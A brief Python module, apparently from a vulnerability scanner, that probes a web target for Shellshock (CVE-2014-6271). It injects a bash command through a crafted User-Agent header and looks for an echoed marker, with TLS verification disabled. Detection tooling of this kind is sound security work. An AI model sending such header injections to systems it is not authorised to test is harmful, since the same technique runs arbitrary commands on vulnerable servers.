import requests

requests.packages.urllib3.disable_warnings()

SHELLSHOCK = {
    "id": "CVE-2014-6271",
    "name": "Shellshock (Bash CGI)",
    "test": lambda target: test_shellshock(target)
}

def test_shellshock(target):
    headers = {"User-Agent": "() { :; }; echo NOXPY_SHELLSHOCK"}

    try:
        r = requests.get(target, headers=headers, timeout=5, verify=False)
    except Exception:
        return "[-] Target unreachable"

    if "NOXPY_SHELLSHOCK" in r.text:
        return "[!] Possible Shellshock vulnerability detected"

    return "[+] No Shellshock indicators observed"
